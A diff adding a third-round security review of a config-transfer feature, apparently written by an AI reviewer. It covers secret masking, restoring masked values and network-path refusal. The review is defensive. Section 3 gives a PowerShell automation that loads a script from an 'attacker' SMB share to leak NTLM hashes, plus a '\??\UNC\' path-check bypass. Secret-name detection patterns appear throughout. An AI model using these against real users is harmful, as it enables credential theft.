@@ -424,3 +424,165 @@ Fix:
 Status: DONE_WITH_CONCERNS
 Summary: Round 2 fixes H1 and H2 and every round-1 Medium and Low. Focused tests pass (Rust 18, Vitest 56, typecheck, i18n), and the test hook cannot reach the real credential store. Nothing blocks merge.
 Concerns/Blockers: No blockers. Recommended before release: R2-M1 (forget the passwords before writing the vault, or in the failure path) and R2-M2 (keep the local value when the incoming one is masked, and narrow `PASS`/`SESSION`). Pre-existing, separate ticket: askpass answering with another saved host's password when the server writes the prompt.
+
+(The status block above is round 2's. Round 3 follows.)
+
+---
+
+# Round 3: `git diff 71e9f7c 6c36835`
+
+Checks run (HEAD 6c36835, worktree clean):
+- `cargo test -p kelpie -j 2 config_transfer` (CARGO_TARGET_DIR=D:\kelpie-p9-target, CARGO_INCREMENTAL=0): 21/21 pass.
+- `pnpm exec vitest run src/lib/config-transfer.test.ts`: 29/29 pass.
+- `pnpm typecheck`: clean.
+- `pnpm i18n:check`: 0 missing.
+- The name matcher and the text masker were checked against a Python port of `secret_name` / `mask_text` / `redact`.
+
+No e2e was run, no daemon was started, and the keyring was not touched.
+
+## Verdict
+
+R2-M1 is fixed. R2-M2 is fixed for the cases it named, and nothing in round 3 blocks merge.
+
+Three new Medium findings are recommended fixes:
+- **R3-M1:** argument pairing can drop a lone flag, or substitute the wrong value.
+- **R3-M2:** network paths inside a shell automation's arguments are still read when the daemon saves it.
+- **R3-M3:** the narrowed name matcher now misses `SSHPASS`, `DBPASS` and similar names.
+
+## 1. R2-M2: name matching and keeping local values
+
+**False positives:** fixed.
+- `PASS`, `PWD`, `KEY`, `AUTH`, `OAUTH`, `COOKIE` and `APIKEY` now count only as a whole name part. `PASSWORD`, `PASSWD`, `SECRET`, `TOKEN` and `CREDENTIAL(S)` still count at the end of a part.
+- camelCase is split (`apiKey` → `API`,`KEY`). `…env_key` is exempt. `SESSION` alone no longer counts.
+- These are no longer masked: `BYPASS`, `--dangerously-bypass-approvals-and-sandbox`, `--session-id`, `--no-session-persistence`, `XDG_SESSION_TYPE`, `MONKEY`, `model_providers.x.env_key=OPENAI_API_KEY`. All are tested.
+
+**The names you listed:** caught.
+- `apiKey`, `OPENAI_API_KEY`, `x-api-key`, `X-Api-Key` and `APIKey` are caught as names.
+- `Authorization: Bearer <≥16 chars>` in free text is masked by `redact`.
+
+**R3-M3 (Medium, non-blocking): new false negatives, plus remaining text gaps.**
+
+Ported matcher results:
+- **New regressions:** round 2 caught these, round 3 does not. The whole-part rule misses a secret word glued into a single part:
+  - `SSHPASS` (the standard variable `sshpass -e` reads), `DBPASS`;
+  - `PRIVATEKEY`/`privatekey`, `SECRETKEY`, `ACCESSKEY`, `MYAPIKEY`;
+  - `OPENAIKey` and `HTTPAuth`: an acronym before a capital is not split.
+  - `redact` still catches some of these when the value is plain: `PRIVATE_?KEY`, `SECRET_?KEY`, `ACCESS_?KEY`, `API_?KEY` at the end of an upper-case name.
+  - It never catches `SSHPASS` or `DBPASS`. The text `SSHPASS=hunter2 sshpass -e ssh host` now passes through unmasked; round 2 masked it.
+- **Never caught (pre-existing):**
+  - names `PASSPHRASE`/`GPG_PASSPHRASE`, `GITHUB_PAT`, `AUTHORIZATION`, `SLACK_WEBHOOK_URL`;
+  - text `-H "x-api-key: abc…"`, `Authorization: Basic …`, `Bearer` with fewer than 16 characters;
+  - argv form `["-u","admin:hunter2"]` and `["-phunter2"]`: `USER_PASSWORD` and `MYSQL_PASSWORD` only match inside one string;
+  - `sshpass -p hunter2`.
+
+Fix:
+- Keep whole-part matching for `PASS`/`KEY`/`AUTH`, and add suffixes that are unambiguous when glued on: `SSHPASS`, `DBPASS`, `PRIVATEKEY`, `SECRETKEY`, `ACCESSKEY`, `APIKEY`, `PASSPHRASE`. Or match a `PASS` ending unless the part is in a short list such as `BYPASS`/`COMPASS`.
+- Add `PASSPHRASE`, `PAT`, `AUTHORIZATION` and `WEBHOOK` as parts.
+- Split acronym → Capital+lower (`HTTPAuth` → `HTTP`,`Auth`).
+- In `mask_args`, treat `-u <user:pass>` and `-p<value>` after `mysql`/`sshpass` as pairs.
+- Mask the value of a header that names a secret (`x-api-key:`, `Authorization: Basic`).
+
+The UI copy already says the filter is a heuristic and the file should be checked, so this does not block.
+
+**Keeping this computer's value: correct for the main cases.**
+- A masked setting keeps the local value. `shellArgs` is resolved element by element.
+- Quick-command and layout name/text, host text fields, env, and an automation's name, cwd, prompt, command and glob take the local value. Without one, the field is left empty, or the item is left out when it cannot work without it.
+- Everything left empty or left out is listed in `fillIn`, which is part of `planShown`, so a stale preview is refused.
+- The test asserts `[redacted]` is never in the planned settings, vault or automations.
+- One gap remains: profile `kind` and automation `kind` are not run through `unmask`. Only a literal `[redacted]` kind in the file could reach config, which is negligible.
+
+**R3-M1 (Medium, non-blocking): `unmaskArgs` pairs any masked element with the flag before it.**
+
+Rust produces `[…, flag, "[redacted]"]` only after a secret-named flag. Other masks are partial, inside a positional element (a URL password, `TOKEN=…` text, a `sk-…` token). `unmaskArgs` (`config-transfer.ts:122-156`) treats the element before any masked element as its flag when that element starts with `-`:
+1. **A lone flag is dropped.**
+   - `["--read-only", "https://u:[redacted]@db/x"]` with no local value: `out.pop()` removes `--read-only`, and the URL goes too. The result is `[]`.
+   - `["--safe", "TOKEN=[redacted]"]`: the `-c api_key=X` rule pops `--safe`.
+   - For a shell automation, `deploy.ps1 -WhatIf https://u:[redacted]@h` becomes `deploy.ps1`. Fields starting with `command:` are not in `essential`, so the automation is still imported, running a different command without `-WhatIf`.
+   - It arrives off and unapproved, and the run list shows the final command, so this is visible but easy to miss.
+2. **The wrong value is used.**
+   - `valueAfter(flag)` takes the value after the first occurrence of the flag on this computer.
+   - With `["-H","Authorization: Bearer [redacted]"]` and local `["-H","Accept: x","-H","Authorization: Bearer real"]`, the result is `["-H","Accept: x"]`.
+   - The auth header is silently swapped for a duplicate of another one.
+
+No flag is ever left without its value: whenever a flag is kept, its value is too (local or file). So argv never swallows the next argument. The problems are only dropping a lone flag and substituting the wrong value.
+
+Fix:
+- Pair only when the element is exactly `[redacted]`, which is what the secret-flag path produces. For any other masked element, take the local element at the same index if the list shape matches, or else drop that element alone.
+- For shell automations, make any `command:` entry essential, so the item is left out instead of imported with a different command.
+
+## 2. R2-M1: forget before save, and the error messages: fixed
+
+- `applyImport` (`config-transfer.ts:700-704`) forgets moved hosts' passwords first. That happens after the staleness check, the run-confirmation check and the backup, and before any write. A crash, a refused host write or any later failure can no longer leave a password bound to a new address. The worst case is a password the user re-enters.
+- `ImportFailed` lists the aliases whose passwords were cleared in every branch:
+  - "nothing else was changed", when no undo step was registered;
+  - "everything else was put back", when undo ran without failures;
+  - the backup-path message, when an undo failed.
+- A forget that fails part way stops the import before anything is saved, and the hosts already cleared are listed.
+- Tests: "undoes the hosts when the settings cannot be saved; the moved host's password stays cleared" and "a password that cannot be forgotten stops the import before anything is saved".
+
+## 3. The Lows: network paths, device paths, preview completeness
+
+**Network-path (UNC) refusal (`is_unc`, `config_transfer.rs`).**
+- Covered: host `identityFile`, automation `cwd`, shell `program` and `shellArgs[0]`. These are read in both directions, so a refused item is counted as skipped.
+- `\\`, `//`, `\/` and `/\` prefixes, and the `\\?\UNC\…` and `\\.\UNC\…` forms, are caught.
+
+**R3-M2 (Medium, non-blocking): network paths in shell automation arguments are not refused, and the daemon reads them at import.**
+- On `automation.save` the daemon calls `command_hash()` and `check_command()`. For an interpreter, these resolve the script argument and call `is_file()` on it (`crates/kelpied/src/automations.rs:752-768`, `:855`, `covered_files`).
+- So `{"program":"powershell","argv":["-File","\\\\attacker\\s\\x.ps1"]}` makes the daemon open that SMB path, which can leak the user's NTLM hash, as soon as Import is clicked. Nothing needs to be enabled or approved.
+- The command is in the run list, so the user saw it. But the reasoning that refuses network paths for `program` and `cwd` applies equally to argv.
+- Profile args and `shellArgs[1..]` only matter at launch and are shown, which is acceptable. Applying the same rule there would be consistent.
+- Fix: refuse (skip) an automation whose `shell.argv` element is a network path.
+
+**NT prefix bypass (part of R3-M2).**
+- `\??\UNC\server\share\…` is not caught by `is_unc`. Win32 `CreateFileW` passes the `\??\` prefix through as an NT path, so the Rust `is_file()` the daemon calls reaches the share. Add `\??\` to `is_unc` and to `device_path`.
+
+**Device paths (`device_path`).**
+- `\\.\`, `\\?\`, `//./` and `//?/` are refused before `metadata`, on read and on write; tested.
+- **R3-L3 (Low):** mixed separators (`\/.\pipe\x`, `/\?\…`) and `\??\` are not covered. Normalise `/` to `\` before checking the prefix. These paths only come through IPC, never from the dialog.
+
+**Preview completeness: complete.**
+- Hosts: new hosts show their connection target, and `identityFile` is listed for every host.
+- Automations now also show `action`, `when` (event, glob, daily cap, or schedule) and `deliver`; tested.
+- With the round-2 fields, nothing that decides what runs is missing.
+
+**R3-L4 (Low): export silently drops hosts whose `identityFile` is a network path.**
+- A legitimate key on a share now drops the whole host from an export, and the preview only counts it as "unusable".
+- Name it in the export result, or export the host without the key path.
+
+## 4. Undo when a daemon write fails: fixed for the main case
+
+- After a refused save, the daemon is asked for `automation.state`, then `automation.list`.
+- If the daemon holds the imported content, the put-back step is registered and the import fails and undoes, instead of reporting "refused". Tested ("an automation the daemon kept although it reported a failure…").
+- Undo for an added automation now deletes by `op.next.id`; the daemon keeps a given id.
+
+**R3-L2 (Low): the content comparison misses some fields.**
+- `automationContent` compares name, kind, prompt, cwd, args, action, program, argv and trigger. It leaves out `enabled`, env, `every`/`time`/`weekday`, `deliver` and `dry_run`.
+- When the import differs from the replaced local automation only in those fields, a write failure is reported as "refused" with no undo. The usual case is re-importing your own export, which switches it off.
+- The daemon's memory then holds the switched-off copy, and the next successful save persists it.
+- Fix: compare the full automation, leaving out only fields the daemon owns, or always register the put-back step for a replaced automation when the held copy differs from `old` in any way.
+
+**R3-L1 (Low): a kept local value is not mentioned.**
+- When a masked file value is replaced by this computer's value, nothing is noted. For example, the file's quick command `curl -u admin:[redacted] x` is dropped for the local `npm test` (tested).
+- The run list shows no change because old = new, so the user does not learn that the file's version was discarded.
+- Add a `fillIn`-style "kept this computer's value" line.
+
+**R3-L5 (Low): acronym camel-case is not split (`HTTPAuth`, `OPENAIKey`).** See R3-M3.
+
+## Round 3 summary
+
+| ID | Severity | Blocking | Item |
+|---|---|---|---|
+| R2-M1 | — | no (fixed) | Passwords forgotten before anything is saved; every failure message lists the cleared hosts |
+| R2-M2 | — | no (fixed) | False positives removed; masked values keep the local value; `[redacted]` never written |
+| R3-M1 | Medium | no | `unmaskArgs` pairs any masked positional with the flag before it: drops a lone (possibly safety) flag, or uses the wrong local value; a shell command loses arguments yet is still imported |
+| R3-M2 | Medium | no | Network paths in shell automation arguments are read by the daemon at import (NTLM); `\??\UNC\` bypasses `is_unc` |
+| R3-M3 | Medium | no | Name matcher regressions (`SSHPASS`, `DBPASS`, `PRIVATEKEY`, `SECRETKEY`, `ACCESSKEY`, acronym camel-case) plus pre-existing text gaps (`x-api-key:` header, Basic auth, short Bearer, argv `-u user:pass`, `-pPASS`, `PASSPHRASE`, `PAT`) |
+| R3-L1 | Low | no | A kept local value replaces the file's value with no note |
+| R3-L2 | Low | no | The comparison after a write failure ignores enabled, env, schedule and deliver |
+| R3-L3 | Low | no | `device_path`: mixed separators and `\??\` |
+| R3-L4 | Low | no | Export drops hosts with a network-path key file, counted only as "unusable" |
+| R3-L5 | Low | no | Acronym camel-case names are not split |
+
+Status: DONE_WITH_CONCERNS
+Summary: Round 3 fixes R2-M1 (forget-first, with accurate failure messages) and R2-M2 (narrower names, keep-local, `[redacted]` never written), adds daemon-write-failure undo and completes the preview. Rust 21, Vitest 29, typecheck and i18n pass. Nothing blocks merge.
+Concerns/Blockers: No blockers. Recommended before release: R3-M1 (pair only an exact `[redacted]` element with its flag, and leave a shell automation out when its command lost arguments), R3-M2 (refuse network paths in shell argv, and add `\??\` to `is_unc`/`device_path`), R3-M3 (restore `SSHPASS`/`DBPASS`/`*KEY` suffixes and split acronym camel-case).
